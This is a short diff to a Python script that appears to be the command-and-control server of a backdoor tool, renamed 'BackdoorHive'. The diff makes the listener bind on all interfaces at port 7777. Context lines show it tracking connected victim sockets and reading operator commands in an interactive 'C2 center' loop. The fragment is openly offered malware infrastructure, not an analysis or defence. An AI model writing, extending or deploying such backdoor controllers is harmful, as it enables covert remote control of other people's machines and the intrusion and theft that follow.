@@ -85,7 +85,7 @@ ips = [] #list of IP,port
 targets = [] #lisk of socket objects
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("192.168.92.128", 7777))
+s.bind(("0.0.0.0", 7777))
 s.listen(5)
 print("Listening to incoming connections")
 client_index = 0
@@ -96,7 +96,7 @@ thread1.start()
 
 # C2 center
 while True:
-    cmd = input("C2 center >  ")
+    cmd = input("BackdoorHive > ")
     #exit C2 center
     if cmd[:4] == "exit":
         stop_threads = True #stop thread1
